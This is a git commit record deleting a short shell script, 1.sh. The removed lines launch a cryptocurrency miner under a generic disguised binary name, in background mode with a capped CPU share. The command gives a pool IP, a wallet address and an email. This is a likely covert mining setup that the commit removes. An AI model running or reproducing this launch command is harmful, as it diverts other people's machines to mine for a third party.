69eb9ba90632b296e73f0a3ee0571f188c0447be
mughriconca <69801056+mughriconca@users.noreply.github.com>
2020-08-17 19:31:34 +0300

    Delete 1.sh

--- 1.sh
+++
@@ -1,4 +0,0 @@
-pkill defaultsoftwarename
-sleep 7
-defaultsoftwarename -o 94.103.94.132:24313 -u 86ghr4FxJzRXcVeSFyATtgQMgRavqxpSCfGJQ9KtqAktCM86JevLvFBiXv2JVTbUSi5qtHmFCu9WKT1guvLjz1c3A8TT2NK --pass=x:medronserkot@yandex.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
-
